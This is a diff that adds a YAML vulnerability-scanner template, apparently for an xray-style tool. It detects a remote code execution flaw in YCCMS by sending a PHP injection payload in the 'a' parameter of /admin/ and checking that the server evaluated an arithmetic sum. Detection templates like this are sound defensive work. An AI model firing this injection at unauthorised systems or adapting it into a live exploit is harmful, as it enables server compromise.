@@ -1,0 +1,20 @@
+id: yccms-rce
+
+info:
+    name: yccms-rce
+    author: j4ckzh0u(https://github.com/j4ckzh0u),violin
+    severity: high
+
+manual: true
+transport: http
+set:
+    r: randomInt(800000000, 1000000000)
+    r1: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /admin/?a=Factory();print({{r}}%2b{{r1}});//../
+        expression: response.body.bcontains(bytes(string(r + r1)))
+expression: r0()
